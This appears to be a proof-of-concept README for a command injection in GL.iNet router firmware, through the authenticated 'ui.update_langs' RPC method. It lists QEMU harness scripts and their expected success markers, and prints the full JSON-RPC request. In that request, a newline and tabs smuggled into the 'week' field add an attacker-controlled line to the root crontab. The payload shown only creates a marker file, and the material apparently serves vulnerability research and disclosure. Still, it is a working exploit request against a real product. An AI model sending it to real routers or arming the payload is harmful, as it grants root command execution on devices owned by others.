# PoC Reproduction

## QEMU Lua RPC Harness

From the package root:

```sh
sh ./poc/verify_glinet_ui_update_langs_rpc_lua_cron_cmdi_2026_07_07.sh
```

Expected success markers:

```text
VALIDATOR_RC=0
NGX_SPAWN=/etc/init.d/gl_timer restart
MARKER_CREATED=/tmp/glinet_ui_rpc_timer_pwn
```

This harness loads the real `ui` RPC Lua module and real `ui.lua` validator under QEMU. It stubs nginx/ubus runtime APIs only where needed to execute the Lua module outside the router's nginx worker.

## QEMU/rootfs Harness

From the package root:

```sh
sh ./poc/verify_glinet_ui_update_langs_gl_timer_cron_cmdi_2026_07_07.sh
```

Expected success marker:

```text
MARKER_CREATED=/tmp/glinet_ui_timer_pwn
```

The script defaults to:

```text
ROOT=/mnt/e/competition/new_project_for_find_bug/analysis/GL.iNet/runtime_rootfs/GL-MT6000
```

Override `ROOT` if the extracted firmware rootfs is elsewhere.

## Authenticated RPC Request Shape

The vulnerable production request is:

```json
{
  "jsonrpc": "2.0",
  "method": "call",
  "params": [
    "<admin_sid>",
    "ui",
    "update_langs",
    {
      "enable": true,
      "hour": "0",
      "min": "0",
      "week": [
        "1\n0-59\t0-23\t1-31\t1-12\t0-6\ttouch\t/tmp/glinet_ui_timer_pwn\t#"
      ],
      "list": []
    }
  ],
  "id": 1
}
```

After `gl_timer` restarts or regenerates cron files, the resulting root crontab contains an attacker-controlled second line.

## Notes

- This package does not include a real-device proof.
- The Lua RPC harness validates the default RPC validator, real `ui.update_langs` method call, firmware `uci` persistence, and generated-cron command execution.
- A full `/rpc` proof should use an administrator session and avoid destructive payloads.
